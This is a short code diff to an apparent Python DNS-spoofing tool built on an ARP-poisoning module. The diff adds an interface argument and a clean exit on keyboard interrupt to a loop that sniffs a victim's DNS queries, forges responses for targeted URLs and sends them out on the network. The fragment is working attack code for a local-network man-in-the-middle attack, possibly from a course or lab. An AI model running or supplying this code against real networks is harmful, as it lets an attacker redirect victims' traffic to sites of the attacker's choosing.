@@ -3,7 +3,7 @@ from arpPoison import *
 import time
 
 
-def getDnsMsg(hwA,hwV,ipV,ipG,urlsToSpoof):
+def getDnsMsg(hwA,hwV,ipV,ipG,urlsToSpoof,interface):
 
     print("sniffing")
     
@@ -50,13 +50,18 @@ def dnsPoisoning(interface,a,urlsToSpoof):
 
     while(True):
 
-        (pkt,dnsQueryFromVictim,goodUrl) = getDnsMsg(hwA,hwV,ipV,ipG,urlsToSpoof,interface)
+        try:
 
-        if dnsQueryFromVictim and goodUrl:
+            (pkt,dnsQueryFromVictim,goodUrl) = getDnsMsg(hwA,hwV,ipV,ipG,urlsToSpoof,interface)
+
+            if dnsQueryFromVictim and goodUrl:
 	
-            dnsResponse = dnsForgeResponse(pkt, urlsToSpoof)
-            sendp(dnsResponse, iface=interface)
-            print("DNS response sent")
+                dnsResponse = dnsForgeResponse(pkt, urlsToSpoof)
+                sendp(dnsResponse, iface=interface)
+                print("DNS response sent")
+
+        except KeyboardInterrupt:
+            return
 
     return
 
